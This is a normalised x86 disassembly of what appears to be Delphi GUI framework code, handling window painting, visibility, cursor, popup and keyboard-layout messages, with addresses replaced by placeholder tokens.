sub_4567f8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0xc ]
call sub_455d1c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45681c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_455d1c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_456840
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x4 ]
call sub_455d1c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_456860
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov ecx ebx
mov eax ebx
call sub_4554f4
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_458904
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_456894
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_432228
mov edi eax
mov eax edi
call sub_432330
test al al
je r-xdata
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x1a4 ]
call sub_424fec
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4585f8
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_432430
jmp r-xdata
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_44d5ec
jmp r-xdata
sub_456934
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1d9 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x1b4 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x1b4 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
movzx eax [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_452954
test bl bl
je r-xdata
mov eax edi
call sub_458910
mov eax edi
call sub_4584fc
pop edx
pop edi
pop esi
pop ebx
retn
movzx eax [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_4584fc
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_4569f4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_452590
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_456a48
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_458910
mov eax esi
call sub_45342c
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_45422c
test [ esi + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov si 0xffcf
call sub_40484c
sub_456a9c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x1b4 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
movzx edi [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
push 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_4503d4
lea edx [ esp + 0x10 ]
xor ecx ecx
mov eax ebx
call sub_455430
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4461a0
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_444280
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
movzx edi [ eax + 0x7c ]
mov di 0xfffe
jmp r-xdata
movzx edi [ ebx + 0x7c ]
mov di 0xfffe
jmp r-xdata
sub_456c00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_456d1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456d26
lea eax [ ebp - 0x8 ]
call sub_405530
retn
cmp [ esi + 0x1bc ] 0x0
je r-xdata
mov eax esi
call sub_4585f8
movzx edx [ esi + 0x1b8 ]
call sub_45d96c
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4441f8
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x1bc ]
test ebx ebx
je r-xdata
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push edi
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push ebx
mov eax [ esi + 0x1bc ]
call sub_4059dc
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
je r-xdata
sub edi 0x4
mov edi [ edi ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_443ff8
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ eax + 0x3c ]
cmp [ esi + 0x1b8 ] 0x0
je r-xdata
push 0x1
push edi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_443ff8
mov edx [ esi + 0x1bc ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_443ff8
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
sub_456d30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_456dff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456e06
lea eax [ ebp - 0x8 ]
call sub_405530
retn
cmp [ ebx + 0x1bc ] 0x0
je r-xdata
cmp [ ebx + 0x1b8 ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4441f8
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1bc ]
test esi esi
je r-xdata
mov eax ebx
call sub_4585f8
mov dl 0x1
call sub_45d950
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
sub esi 0x4
mov esi [ esi ]
push edi
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push esi
mov eax [ ebx + 0x1bc ]
call sub_4059dc
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
je r-xdata
sub edi 0x4
mov edi [ edi ]
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_456e64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ ebp + 0x8 ]
mov eax edi
call sub_418438
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_451b4c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1e2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_456eb4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
movzx ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_456ee8
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffd1
call sub_40484c
mov eax [ ebp + 0x10 ]
push eax
movzx eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc2
call sub_40484c
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn 0xc
sub_456f2c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x222 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_451b4c
test eax eax
je r-xdata
mov [ esp ] al
movzx eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_456f88
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4204e4
mov edx [ r-xdata ]
call sub_404800
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_456fc0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x1ac ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_419898
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_456fe4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_4585f8
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x202 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x204 ]
call [ ebx + 0x200 ]
sub_457040
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_456fac
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x1ac ]
call sub_419898
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_457080
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1b0 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x1b0 ]
call sub_407024
cmp [ ebx + 0x1dc ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1db ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x44 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x240 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_407024
jmp r-xdata
sub edx 0xffffff88
cmp [ ebx + 0x240 ] 0x0
jne r-xdata
sub_4570ec
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
test [ ebx + 0x55 ] 0x8
setne al
xor al 0x1
cmp dl al
je r-xdata
test dl dl
jne r-xdata
and [ ebx + 0x54 ] 0xf7ff
or [ ebx + 0x54 ] 0x800
jmp r-xdata
mov eax ebx
call sub_455094
sub_457120
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_4571c8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1dc ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4571cf
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
mov [ edi + 0x1dc ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_44e1a0
test bl bl
jne r-xdata
cmp [ edi + 0x1ac ] 0x0
jne r-xdata
mov eax [ edi + 0x1ac ]
call sub_404650
xor eax eax
mov [ edi + 0x1ac ] eax
lea eax [ edi + 0x1b0 ]
call sub_40700c
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc5
call sub_40484c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x1b0 ]
call sub_407024
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ edi + 0x1ac ] eax
sub_4571d8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x4c ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_454204
xor edx edx
push ebp
push sub_45729b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x40 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_40484c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1db ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4572a2
mov eax [ ebp - 0x4 ]
call sub_45420c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x60 ]
push edx
mov edx [ ebp - 0x8 ]
movzx ecx [ eax + 0x5c ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b0 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_4572a2
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_43bd90
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_450af8
sub_4572f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404528
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452dac
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_45735b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x4c ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_40484c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_450af8
sub_457374
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x20a ] 0x0
je r-xdata
pop edx
pop ebx
retn
movzx ecx [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x20c ]
call [ ebx + 0x208 ]
sub_4573a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov bl 0x1
xor edx edx
mov eax esi
call sub_43bd90
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_43bc50
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
movzx ecx [ esp ]
mov eax esi
mov si 0xffba
call sub_40484c
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x275 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebp
call sub_4573a0
test al al
jne r-xdata
mov dl 0x1
mov eax ebp
call sub_43bd90
mov [ esp + 0x4 ] eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp ebp [ esp + 0x4 ]
je r-xdata
mov eax [ esp + 0x4 ]
cmp [ eax + 0x275 ] 0x0
je r-xdata
mov edx edi
mov eax [ esp + 0x4 ]
call sub_4573a0
test al al
jne r-xdata
sub_457448
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4573a0
test al al
jne r-xdata
movzx edx [ esi + 0x4 ]
mov eax ebx
call sub_4597b4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_457474
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4573a0
test al al
jne r-xdata
movzx edx [ esi + 0x4 ]
mov eax ebx
call sub_4597b4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4574a0
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x21a ] 0x0
je r-xdata
pop edx
pop ebx
retn
movzx ecx [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_4574cc
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov dl 0x1
mov eax esi
call sub_43bd90
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_43bc50
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
movzx ecx [ esp ]
mov eax esi
mov si 0xffb9
call sub_40484c
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x275 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4574cc
test al al
jne r-xdata
sub_457534
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4574cc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_457554
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4574cc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_457594
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov dl 0x1
mov eax esi
call sub_43bd90
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
movzx eax [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffb8
call sub_40484c
movzx eax [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x275 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_457594
test al al
jne r-xdata
sub_4575fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_457594
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45761c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4546e8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4546ac
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_451b4c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45761c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_4576cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_45761c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x1b4 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43bd90
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_451b4c
test eax eax
jne r-xdata
sub_457778
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_455d1c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_457798
push ebx
push esi
push edi
mov ebx edx
mov edi eax
movzx esi [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_455d1c
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4577cc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_455d1c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4577ec
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
cmp [ ebx + 0x64 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_459930
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_450804
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_40aabc
mov ebp eax
mov [ ebx + 0x64 ] ebp
mov eax ebp
call sub_40aad0
mov ecx eax
mov edx ebp
mov eax ebx
call sub_450814
mov eax r-xdata
call sub_40aadc
mov [ ebx + 0x64 ] eax
jmp r-xdata
sub_45786c
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_457890
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
movzx edx [ esp ]
mov eax ebp
call sub_44f900
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4546e8
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_4546ac
movzx edx [ esp ]
mov si 0xffd0
call sub_40484c
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_4578e8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd0
call sub_40484c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_45790c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd0
call sub_40484c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_457944
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452b64
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_454778
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_454ff0
sub_45797c
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax esi
mov si 0xffc1
call sub_40484c
pop esi
retn
mov eax esi
call sub_450f68
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_4059dc
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_4059dc
push eax
